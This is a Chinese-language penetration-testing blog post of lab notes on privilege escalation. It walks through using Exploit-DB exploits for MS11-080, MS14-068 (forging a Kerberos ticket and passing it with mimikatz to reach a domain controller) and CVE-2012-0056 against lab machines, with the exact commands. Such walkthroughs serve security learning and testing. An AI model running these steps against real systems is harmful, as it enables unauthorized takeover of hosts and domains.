---
title: "提权-利用漏洞提权"
date: "2020-09-22T21:04:03+08:00"
description: ""
categories: ["信息安全","渗透测试"]
tags: ["渗透测试", "漏洞分析", "MSF", "后渗透", "Windows", "Kali"]
legacyPath: "/posts/acfc05df.html"
topic: security
subtopic: post-exploitation
qualityScore: 88
---
<h2 id="提权-利用漏洞提权"><a href="#提权-利用漏洞提权" class="headerlink" title="提权-利用漏洞提权"></a>提权-利用漏洞提权</h2><h2 id="Ms11-080"><a href="#Ms11-080" class="headerlink" title="Ms11-080"></a>Ms11-080</h2><ul>
<li><p>Kb2592799</p>
<ul>
<li><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms11-080</a></li>
</ul>
</li>
<li><p>先把python编译成exe，再在目标机器执行</p>

<ul>
<li><a href="https://pypi.org/project/pywin32/" target="_blank" rel="noopener">https://pypi.org/project/pywin32/</a> (pyinstaller会调用pywin32)</li>
<li>pyinstaller.org</li>
</ul>
</li>
</ul>
<figure class="hljs highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">searchsploit ms11-080<br>cp /usr/share/exploitdb/exploits/windows/local/18176.py .<br></code></pre></td></tr></table></figure>

<ul>
<li>如果目标机器有python环境，直接执行就可以。</li>
</ul>
<h2 id="Ms14-068"><a href="#Ms14-068" class="headerlink" title="Ms14-068"></a>Ms14-068</h2><ul>
<li><p>从本机管理员权限获取域管理员权限</p>
</li>
<li><ol>
<li><code>searchsploit ms14-068</code>得到35474.py</li>
<li><code>cp /usr/share/exploitdb/exploits/windows/remote/35474.py ~/ms14-068.py</code></li>
<li>在windows通过kali /usr/share/windows-resources/binaries/whoami.exe得到域用户的sid，还需要域控制器的ip。</li>
<li>使用漏洞利用代码生成TGT票据（kerbros协议的票据）<ul>
<li><code>python ms14-068.py -u u1@lab.com -s S-1-5-21-1226907004-2355705551-2341087478-1109 -d 192.168.0.119</code></li>
<li>输入u1域用户的密码</li>
</ul>
<ol start="5">
<li>拷贝票据到windows系统</li>
</ol>
</li>
<li>通过minikatz完成提权<ul>
<li><code>kerberos::ptc TGT_u1@lab.com.ccache</code> </li>
</ul>
</li>
<li>发现可以访问域控制器的C盘</li>
</ol>
<ul>
<li>如果kali缺少python库文件，下载地址：<a href="https://github.com/bidord/pykek" target="_blank" rel="noopener">https://github.com/bidord/pykek</a></li>
</ul>
</li>
</ul>
<h2 id="CVE-2012-0056"><a href="#CVE-2012-0056" class="headerlink" title="CVE-2012-0056"></a>CVE-2012-0056</h2><ul>
<li><p>CVE-2012-0056</p>
<ul>
<li>/proc/pid/mem</li>
<li>kernels&gt;=2.6.39</li>
<li><a href="http://blog.zx2c4.com/749" target="_blank" rel="noopener">http://blog.zx2c4.com/749</a></li>
</ul>
</li>
<li><p>Ubuntu11.10</p>
<ul>
<li><a href="http://old-releases.ubuntu.com/releases/11.10/" target="_blank" rel="noopener">http://old-releases.ubuntu.com/releases/11.10/</a></li>
</ul>
</li>
<li><p>gcc</p>
<ul>
<li><code>sudo apt-cdrom add</code>把光盘作为apt的更新源 </li>
<li><code>sudo apt-get install gcc</code></li>
<li><code>gcc 18411.c -o exp</code></li>
</ul>
</li>
<li><p>首先searchesploit 18411.c 找到文件位置 <code>/usr/share/exploitdb/exploits/linux/local</code></p>
</li>
<li><p>scp /usr/share/exploitdb/exploits/linux/local/18411.c <a href="mailto:flower@192.168.0.110">flower@192.168.0.110</a>:/home/flower</p>
</li>
<li><p>gcc编译好后，直接执行./exp，发现命令提示符$变为#，提权成功。</p>
</li>
</ul>
<h2 id="其它："><a href="#其它：" class="headerlink" title="其它："></a>其它：</h2><p>Ms08-067</p>
<p>Ms09-001</p>
<p>Ms10-017</p>
<p>Ms12-020</p>
<h3 id="Kali修改默认python为python3"><a href="#Kali修改默认python为python3" class="headerlink" title="Kali修改默认python为python3"></a>Kali修改默认python为python3</h3><ul>
<li><p><code>rm /usr/bin/python</code></p>
</li>
<li><p><code>ln -s /usr/bin/python3 /usr/bin/python</code></p>
</li>
</ul>
